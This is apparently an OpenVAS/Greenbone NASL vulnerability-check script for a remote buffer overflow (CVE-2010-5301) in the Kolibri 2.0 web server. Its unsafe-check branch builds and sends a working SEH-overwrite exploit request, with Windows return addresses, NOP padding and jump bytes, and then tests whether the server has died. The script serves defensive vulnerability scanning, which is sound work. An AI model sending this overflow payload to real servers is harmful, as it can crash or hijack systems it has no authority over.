# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103009");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-5301");
  script_name("Kolibri Remote Buffer Overflow Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("kolibri/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45579");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow remote attackers to
  execute arbitrary commands in the context of the application. Failed
  attacks will cause denial-of-service conditions.");

  script_tag(name:"affected", value:"Kolibri 2.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Kolibri is prone to a remote buffer-overflow vulnerability because it
  fails to perform adequate checks on user-supplied input.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("version_func.inc");

port = http_get_port( default:8080 );
banner = http_get_remote_headers( port:port );
if( ! banner || "server: kolibri" >!< tolower( banner ) ) exit( 0 );

if( safe_checks() ) {

  version = eregmatch( pattern:"server: kolibri-([0-9.]+)", string:tolower( banner ) );

  if( ! isnull( version[1] ) ) {
    if( version_is_equal( version:version[1], test_version:"2.0" ) ) {
      report = report_fixed_ver( installed_version:version[1], fixed_version:"None available" );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
} else {

  useragent = http_get_user_agent();
  host = http_host_name(port:port);

  count = make_list(1,2,3,4);
  ret_offset = 515;

  seh_offset_xp_2k3 = 792;
  seh_offset_vista_7 = 794;

  ret_xp_sp3 = raw_string(0x13,0x44,0x87,0x7C);
  ret_2k3_sp2 = raw_string(0xC3,0x3B,0xF7,0x76);

  foreach c (count) {

    if(c == 1) {
      ret = ret_xp_sp3;
      seh_offset = seh_offset_vista_7;
    }
    else if(c == 2) {
      ret = ret_2k3_sp2;
      seh_offset = seh_offset_vista_7;
    }
    else if (c == 3) {
      ret = ret_xp_sp3;
      seh_offset = seh_offset_xp_2k3;
    }
     else if(c == 4) {
      ret = ret_2k3_sp2;
      seh_offset = seh_offset_xp_2k3;
    }

    seh  = raw_string(0x67,0x1a,0x48);
    nseh = raw_string(0x90,0x90,0xeb,0xf7);
    jmp_back2 = raw_string(0xE9,0x12,0xFF,0xFF,0xFF);

    buf = crap(data:raw_string(0x41),length:ret_offset);
    nops = crap(data:raw_string(0x90),length:(seh_offset - strlen(buf + ret + jmp_back2 + nseh)));

    req = string("HEAD /",buf,ret,nops,jmp_back2,nseh,seh," HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "User-Agent: ",useragent,"\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n",
                 "Accept-Encoding: gzip,deflate\r\n",
                 "Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n",
                 "Keep-Alive: 115\r\n",
                 "Connection: keep-alive\r\n\r\n");

    soc = open_sock_tcp(port);
    if(!soc)exit(0);

    send(socket:soc, data:req);
    close(soc);
    sleep(3);

    if(http_is_dead(port:port)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit( 99 );
